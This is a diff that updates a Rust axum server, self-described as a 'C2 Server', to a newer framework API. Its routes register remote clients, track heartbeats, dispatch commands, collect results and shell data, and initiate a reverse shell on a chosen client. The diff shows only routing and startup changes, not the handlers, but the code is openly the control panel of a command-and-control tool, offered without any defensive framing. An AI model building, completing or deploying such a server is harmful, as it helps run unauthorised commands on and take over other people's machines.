@@ -5,14 +5,15 @@ use axum::{
     http::StatusCode,
     response::Html,
     routing::{get, post},
+    serve,
 };
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
-use std::net::TcpListener as StdTcpListener;
 use std::sync::Arc;
-use tokio::net::TcpListener as TokioTcpListener; // Alias Tokio's TcpListener
+use tokio::net::TcpListener;
 use tokio::sync::RwLock;
-use tower_http::{cors::CorsLayer, services::ServeDir};
+use tower_http::cors::CorsLayer;
+use tower_http::services::ServeDir;
 
 // 引入common模块
 use common::*;
@@ -49,7 +50,7 @@ impl ServerState {
 struct IndexTemplate {
     clients: Vec<DisplayClientInfo>,
     online_clients_count: usize,
-    os_types_count: usize, // Add this field
+    os_types_count: usize,
 }
 
 // New struct to combine ClientInfo with online status for display
@@ -173,7 +174,7 @@ async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusC
     let template = IndexTemplate {
         clients: display_clients,
         online_clients_count,
-        os_types_count: os_types_count, // Pass the calculated count
+        os_types_count,
     };
 
     match template.render() {
@@ -285,31 +286,27 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let app = Router::new()
         // Web界面路由
         .route("/", get(index))
-        .route("/client/:id", get(client_detail))
+        .route("/client/{id}", get(client_detail))
         // API路由
         .route("/api/register", post(register_client))
         .route("/api/heartbeat", post(handle_heartbeat))
-        .route("/api/commands/:client_id", get(get_commands))
+        .route("/api/commands/{client_id}", get(get_commands))
         .route("/api/command_result", post(handle_command_result))
         .route("/api/shell_data", post(handle_shell_data))
         .route("/api/clients", get(api_clients))
-        .route("/api/clients/:client_id/commands", post(send_command))
-        .route("/api/clients/:client_id/results", get(api_command_results))
-        .route("/api/clients/:client_id/reverse_shell", post(initiate_reverse_shell))
+        .route("/api/clients/{client_id}/commands", post(send_command))
+        .route("/api/clients/{client_id}/results", get(api_command_results))
+        .route("/api/clients/{client_id}/reverse_shell", post(initiate_reverse_shell))
+        .with_state(state)
         // 静态文件服务
         .nest_service("/static", ServeDir::new("web/static"))
-        .layer(CorsLayer::permissive())
-        .with_state(state);
+        .layer(CorsLayer::permissive());
 
     println!("C2 Server starting on http://0.0.0.0:8080");
 
-    let listener = TokioTcpListener::bind("0.0.0.0:8080").await?;
-    let std_listener: StdTcpListener = listener.into_std()?; // Convert to std::net::TcpListener
-    std_listener.set_nonblocking(true)?; // Set non-blocking for hyper
-
-    axum::Server::from_tcp(std_listener)?
-        .serve(app.into_make_service())
-        .await?;
+    let listener = TcpListener::bind("0.0.0.0:8080").await?;
+    
+    serve(listener, app).await?;
 
     Ok(())
 }
